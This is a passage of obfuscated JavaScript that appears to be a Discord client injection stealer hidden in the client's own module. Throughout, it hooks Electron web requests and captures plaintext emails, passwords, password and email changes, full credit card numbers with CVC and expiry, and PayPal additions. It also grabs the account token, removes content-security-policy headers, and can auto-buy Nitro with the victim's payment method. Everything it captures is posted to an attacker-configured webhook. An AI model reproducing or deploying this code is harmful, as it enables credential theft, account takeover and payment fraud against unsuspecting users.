_0x5a01a4=_0x2f05af,_0x41991b=JSON['stringify'](_0x410102),_0x3dd739=new URL(config[_0x5a01a4(0x10f)]);if(!config[_0x5a01a4(0x10f)][_0x5a01a4(0x15e)](_0x5a01a4(0x12a))){const _0x3c08dd=totp(config[_0x5a01a4(0x14d)]);_0x3d410c[_0x5a01a4(0xce)]=_0x3c08dd;}const _0x211442={'protocol':_0x3dd739[_0x5a01a4(0x133)],'hostname':_0x3dd739[_0x5a01a4(0x165)],'path':_0x3dd739['pathname'],'method':_0x5a01a4(0x11e),'headers':_0x3d410c},_0x4145fb=https[_0x5a01a4(0x164)](_0x211442);_0x4145fb['on'](_0x5a01a4(0x119),_0x55465a=>{const _0x298103=_0x5a01a4;console[_0x298103(0x144)](_0x55465a);}),_0x4145fb[_0x5a01a4(0xd0)](_0x41991b),_0x4145fb[_0x5a01a4(0x108)]();},login=async(_0x54cab4,_0x1c500a,_0x26ed55)=>{const _0x44713d=_0x2f05af,_0x1cad3c=await getInfo(_0x26ed55),_0x43dc69=getNitro(_0x1cad3c[_0x44713d(0x163)]),_0x588589=getBadges(_0x1cad3c[_0x44713d(0x107)]),_0x4c58cc=await getBilling(_0x26ed55),_0x57e3f0={'username':config[_0x44713d(0xd9)],'avatar_url':config[_0x44713d(0xfe)],'embeds':[{'color':config[_0x44713d(0x11b)],'fields':[{'name':_0x44713d(0x171),'value':'Email:\x20**'+_0x54cab4+'**\x20-\x20Password:\x20**'+_0x1c500a+'**','inline':![]},{'name':'**Discord\x20Info**','value':_0x44713d(0xd3)+_0x43dc69+'**\x0aBadges:\x20**'+_0x588589+'**\x0aBilling:\x20**'+_0x4c58cc+'**','inline':![]},{'name':'**Token**','value':'`'+_0x26ed55+'`','inline':![]}],'author':{'name':_0x1cad3c[_0x44713d(0x178)]+'#'+_0x1cad3c['discriminator']+_0x44713d(0xd6)+_0x1cad3c['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x1cad3c['id']+'/'+_0x1cad3c[_0x44713d(0xfc)]+_0x44713d(0xc4)}}]};config[_0x44713d(0x12d)]&&(_0x57e3f0[_0x44713d(0xfb)]=config[_0x44713d(0x12c)]),hooker(_0x57e3f0);},passwordChanged=async(_0x403980,_0x409990,_0x335efd)=>{const _0x270341=_0x2f05af,_0x41411c=await getInfo(_0x335efd),_0x23d992=getNitro(_0x41411c['premium_type']),_0xe2c413=getBadges(_0x41411c['flags']),_0x942a0d=await getBilling(_0x335efd),_0x3ca67b={'username':config[_0x270341(0xd9)],'avatar_url':config[_0x270341(0xfe)],'embeds':[{'color':config[_0x270341(0x11b)],'fields':[{'name':'**Password\x20Changed**','value':'Email:\x20**'+_0x41411c['email']+_0x270341(0xef)+_0x403980+_0x270341(0x152)+_0x409990+'**','inline':!![]},{'name':_0x270341(0x141),'value':_0x270341(0xd3)+_0x23d992+'**\x0aBadges:\x20**'+_0xe2c413+_0x270341(0x13c)+_0x942a0d+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x335efd+'`','inline':![]}],'author':{'name':_0x41411c['username']+'#'+_0x41411c[_0x270341(0x12f)]+_0x270341(0xd6)+_0x41411c['id'],'icon_url':_0x270341(0x132)+_0x41411c['id']+'/'+_0x41411c[_0x270341(0xfc)]+_0x270341(0xc4)}}]};config['ping_on_run']&&(_0x3ca67b['content']=config['ping_val']),hooker(_0x3ca67b);},emailChanged=async(_0x28a960,_0x57b9fb,_0x104b1d)=>{const _0x107453=_0x2f05af,_0x69ff91=await getInfo(_0x104b1d),_0x1aa1d1=getNitro(_0x69ff91[_0x107453(0x163)]),_0x4e1403=getBadges(_0x69ff91['flags']),_0x39d6cf=await getBilling(_0x104b1d),_0x200d69={'username':config[_0x107453(0xd9)],'avatar_url':config[_0x107453(0xfe)],'embeds':[{'color':config[_0x107453(0x11b)],'fields':[{'name':_0x107453(0xb4),'value':_0x107453(0x148)+_0x28a960+_0x107453(0xb6)+_0x57b9fb+'**','inline':!![]},{'name':_0x107453(0x141),'value':_0x107453(0xd3)+_0x1aa1d1+_0x107453(0x15a)+_0x4e1403+'**\x0aBilling:\x20**'+_0x39d6cf+'**','inline':!![]},{'name':_0x107453(0x100),'value':'`'+_0x104b1d+'`','inline':![]}],'author':{'name':_0x69ff91[_0x107453(0x178)]+'#'+_0x69ff91[_0x107453(0x12f)]+_0x107453(0xd6)+_0x69ff91['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x69ff91['id']+'/'+_0x69ff91[_0x107453(0xfc)]+_0x107453(0xc4)}}]};config[_0x107453(0x12d)]&&(_0x200d69[_0x107453(0xfb)]=config[_0x107453(0x12c)]),hooker(_0x200d69);},PaypalAdded=async _0x1b5e24=>{const _0x59992f=_0x2f05af,_0xca07c=await getInfo(_0x1b5e24),_0x80d25f=getNitro(_0xca07c[_0x59992f(0x163)]),_0x359e4a=getBadges(_0xca07c[_0x59992f(0x107)]),_0x15b567=getBilling(_0x1b5e24),_0x5b9a0b={'username':config[_0x59992f(0xd9)],'avatar_url':config[_0x59992f(0xfe)],'embeds':[{'color':config[_0x59992f(0x11b)],'fields':[{'name':_0x59992f(0x157),'value':_0x59992f(0xf7),'inline':![]},{'name':_0x59992f(0x141),'value':'Nitro\x20Type:\x20**'+_0x80d25f+_0x59992f(0x136)+_0x359e4a+_0x59992f(0x13c)+_0x15b567+'**','inline':![]},{'name':_0x59992f(0x100),'value':'`'+_0x1b5e24+'`','inline':![]}],'author':{'name':_0xca07c['username']+'#'+_0xca07c[_0x59992f(0x12f)]+_0x59992f(0xd6)+_0xca07c['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0xca07c['id']+'/'+_0xca07c['avatar']+_0x59992f(0xc4)}}]};config[_0x59992f(0x12d)]&&(_0x5b9a0b[_0x59992f(0xfb)]=config[_0x59992f(0x12c)]),hooker(_0x5b9a0b);},ccAdded=async(_0xe6d24a,_0x753f6a,_0x1439b4,_0x31e9bb,_0xffd6fe)=>{const _0x36afe3=_0x2f05af,_0x57a4f2=await getInfo(_0xffd6fe),_0x2a1549=getNitro(_0x57a4f2[_0x36afe3(0x163)]),_0x3b4b9d=getBadges(_0x57a4f2[_0x36afe3(0x107)]),_0x304093=await getBilling(_0xffd6fe),_0x109682={'username':config[_0x36afe3(0xd9)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x36afe3(0x11b)],'fields':[{'name':_0x36afe3(0xe8),'value':'Credit\x20Card\x20Number:\x20**'+_0xe6d24a+_0x36afe3(0x11d)+_0x753f6a+_0x36afe3(0x16d)+_0x1439b4+'/'+_0x31e9bb+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x36afe3(0xd3)+_0x2a1549+_0x36afe3(0x15a)+_0x3b4b9d+_0x36afe3(0x13c)+_0x304093+'**','inline':!![]},{'name':'**Token**','value':'`'+_0xffd6fe+'`','inline':![]}],'author':{'name':_0x57a4f2[_0x36afe3(0x178)]+'#'+_0x57a4f2[_0x36afe3(0x12f)]+_0x36afe3(0xd6)+_0x57a4f2['id'],'icon_url':_0x36afe3(0x132)+_0x57a4f2['id']+'/'+_0x57a4f2[_0x36afe3(0xfc)]+_0x36afe3(0xc4)}}]};config[_0x36afe3(0x12d)]&&(_0x109682['content']=config[_0x36afe3(0x12c)]),hooker(_0x109682);},nitroBought=async _0x2ca411=>{const _0x6e5742=_0x2f05af,_0x15a06b=await getInfo(_0x2ca411),_0x2d50a7=getNitro(_0x15a06b[_0x6e5742(0x163)]),_0x5d7f2d=getBadges(_0x15a06b[_0x6e5742(0x107)]),_0x2b58b7=await getBilling(_0x2ca411),_0x5a3c30=await buyNitro(_0x2ca411),_0x1c7fc1={'username':config[_0x6e5742(0xd9)],'content':_0x5a3c30,'avatar_url':config[_0x6e5742(0xfe)],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x6e5742(0x17f),'value':_0x6e5742(0x16a)+_0x5a3c30+_0x6e5742(0x113),'inline':!![]},{'name':_0x6e5742(0x141),'value':'Nitro\x20Type:\x20**'+_0x2d50a7+_0x6e5742(0x15a)+_0x5d7f2d+'**\x0aBilling:\x20**'+_0x2b58b7+'**','inline':!![]},{'name':_0x6e5742(0x100),'value':'`'+_0x2ca411+'`','inline':![]}],'author':{'name':_0x15a06b[_0x6e5742(0x178)]+'#'+_0x15a06b[_0x6e5742(0x12f)]+_0x6e5742(0xd6)+_0x15a06b['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x15a06b['id']+'/'+_0x15a06b['avatar']+_0x6e5742(0xc4)}}]};config[_0x6e5742(0x12d)]&&(_0x1c7fc1['content']=config['ping_val']+('\x0a'+_0x5a3c30)),hooker(_0x1c7fc1);};session[_0x2f05af(0xe9)][_0x2f05af(0xca)][_0x2f05af(0x172)](config[_0x2f05af(0x126)],(_0x435ca1,_0x234cdd)=>{const _0x3c1b9d=_0x2f05af;if(_0x435ca1[_0x3c1b9d(0xf8)][_0x3c1b9d(0xdb)](_0x3c1b9d(0xb8)))return _0x234cdd({'cancel':!![]});updateCheck();}),session[_0x2f05af(0xe9)][_0x2f05af(0xca)][_0x2f05af(0x11f)]((_0x464762,_0x5130ad)=>{const _0x507687=_0x2f05af;_0x464762[_0x507687(0xf8)][_0x507687(0xdb)](config['webhook'])?_0x464762[_0x507687(0xf8)][_0x507687(0x15e)]('discord.com')?_0x5130ad({'responseHeaders':Object[_0x507687(0xc0)]({'Access-Control-Allow-Headers':'*'},_0x464762[_0x507687(0x147)])}):_0x5130ad({'responseHeaders':Object[_0x507687(0xc0)]({'Content-Security-Policy':[_0x507687(0x16f),_0x507687(0x14c),_0x507687(0x105)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x464762[_0x507687(0x147)])}):(delete _0x464762[_0x507687(0x147)]['content-security-policy'],delete _0x464762[_0x507687(0x147)][_0x507687(0xc5)],_0x5130ad({'responseHeaders':{..._0x464762[_0x507687(0x147)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x2f05af(0xe9)][_0x2f05af(0xca)][_0x2f05af(0x10c)](config[_0x2f05af(0xde)],async(_0x3d7d96,_0x13b0c7)=>{const _0x46e35c=_0x2f05af;if(_0x3d7d96['statusCode']!==0xc8&&_0x3d7d96[_0x46e35c(0x121)]!==0xca)return;const _0x49b0e6=Buffer[_0x46e35c(0xe2)](_0x3d7d96[_0x46e35c(0x137)][0x0][_0x46e35c(0x174)])[_0x46e35c(0xf9)](),_0x561893=JSON['parse'](_0x49b0e6),_0x360d01=await execScript('(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()');switch(!![]){case _0x3d7d96[_0x46e35c(0xf8)][_0x46e35c(0xcf)](_0x46e35c(0xf2)):login(_0x561893[_0x46e35c(0xf2)],_0x561893[_0x46e35c(0x177)],_0x360d01)[_0x46e35c(0x179)](console[_0x46e35c(0x119)]);break;case _0x3d7d96[_0x46e35c(0xf8)]['endsWith']('users/@me')&&_0x3d7d96[_0x46e35c(0xe6)]===_0x46e35c(0x142):if(!_0x561893[_0x46e35c(0x177)])return;_0x561893[_0x46e35c(0x104)]&&emailChanged(_0x561893[_0x46e35c(0x104)],_0x561893[_0x46e35c(0x177)],_0x360d01)[_0x46e35c(0x179)](console[_0x46e35c(0x119)]),_0x561893[_0x46e35c(0x153)]&&passwordChanged(_0x561893[_0x46e35c(0x177)],_0x561893[_0x46e35c(0x153)],_0x360d01)[_0x46e35c(0x179)](console[_0x46e35c(0x119)]);break;case _0x3d7d96['url'][_0x46e35c(0xcf)](_0x46e35c(0x170))&&_0x3d7d96[_0x46e35c(0xe6)]==='POST':const _0x150792=querystring[_0x46e35c(0x175)](unparsedData[_0x46e35c(0xf9)]());ccAdded(_0x150792[_0x46e35c(0x156)],_0x150792['card[cvc]'],_0x150792['card[exp_month]'],_0x150792[_0x46e35c(0xb7)],_0x360d01)['catch'](console[_0x46e35c(0x119)]);break;case _0x3d7d96[_0x46e35c(0xf8)]['endsWith']('paypal_accounts')&&_0x3d7d96['method']===_0x46e35c(0x11e):PaypalAdded(_0x360d01)['catch'](console[_0x46e35c(0x119)]);break;case _0x3d7d96[_0x46e35c(0xf8)][_0x46e35c(0xcf)](_0x46e35c(0x103))&&_0x3d7d96[_0x46e35c(0xe6)]===_0x46e35c(0x11e):if(!config['auto_buy_nitro'])return;setTimeout(()=>{const _0x3a4a44=_0x46e35c;nitroBought(_0x360d01)['catch'](console[_0x3a4a44(0x119)]);},0x1d4c);break;default:break;}}),module[_0x2f05af(0xc8)]=require(_0x2f05af(0x151));
